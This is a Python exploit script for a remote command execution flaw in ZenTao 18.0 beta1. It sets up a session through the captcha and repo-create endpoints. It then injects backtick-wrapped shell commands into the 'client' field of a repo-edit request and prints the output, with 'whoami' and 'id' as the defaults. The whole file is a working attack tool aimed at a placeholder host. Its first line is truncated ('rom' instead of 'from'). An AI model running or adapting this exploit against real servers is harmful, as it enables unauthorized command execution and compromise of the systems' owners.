rom requests import session
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings()


class Zentao_180b1_RCE:
    base_url: str = ""
    headers: dict = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    timeout = 5
    proxies: dict = None
    session: requests.Session = None

    def __init__(self, url: str, proxies: dict = None):
        url_data = urlparse(url)
        scheme = "http" if url_data.scheme == "" else url_data.scheme
        self.base_url = scheme + "://" + url_data.netloc
        print("[*] Init: Setting target as", self.base_url)
        if proxies is not None:
            self.proxies = proxies

    def exploit_prepare(self):
        print("[*] Vuln: Zentao_V18.0b1 RCE.")
        if self.session is not None:
            print("[*] Seems prepared.")
            return
        self.session = session()
        real_url = self.base_url + "/misc-captcha-user.html"
        print("[*] Preparing step 1 in:", real_url)
        rsp = self.session.get(url=real_url, proxies=self.proxies, timeout=self.timeout, verify=False,
                               headers=self.headers)
        if rsp.status_code != 200:
            print("[-] Prepared failed in step 1, target seems safe.", rsp.json())
            exit()

        real_url = self.base_url + "/repo-create.html"
        data = {
            "product%5B%5D": 1,
            "SCM": "Gitlab",
            "serviceHost": 1,
            "serviceProject": 1,
            "name": "Names",
            "path": "",
            "encoding": "utf-8",
            "client": "",
            "account": "",
            "password": "",
            "encrypt": "base64",
            "desc": "",
            "uid": ""
        }
        print("[*] Preparing step 2 in:", real_url)
        self.headers["Referer"] = self.base_url + "/repo-edit-1-0.html"
        rsp = self.session.post(url=real_url, data=data, proxies=self.proxies, timeout=self.timeout, verify=False,
                                headers=self.headers)
        if rsp.status_code != 200:
            print("[-] Prepared failed in step 2, target seems safe.", rsp.text)
            exit()

    def run_command(self, cmd: str = "id"):
        if self.session is None:
            self.exploit_prepare()
        real_url = self.base_url + "/repo-edit-10000-10000.html"
        data = {
            "SCM": "Subversion",
            "client": f"`{cmd}`"
        }
        print(f"[*] Running command [{cmd}] in:", real_url)
        rsp = self.session.post(url=real_url, data=data, proxies=self.proxies, timeout=self.timeout, verify=False,
                                headers=self.headers)
        if rsp.status_code != 200 or "sh: 1:" not in rsp.text:
            print("[-] Exploit failed, target seems safe.", rsp.json())
            exit()
        print("[+] Vunl found in target:", self.base_url)
        print("[+] Command rsp:", rsp.json()["message"]["client"].strip())


if __name__ == '__main__':
    host_addr = "http://[ip]:[port]/"
    ins = Zentao_180b1_RCE(url=host_addr)
    ins.run_command("whoami")
    ins.run_command("id")
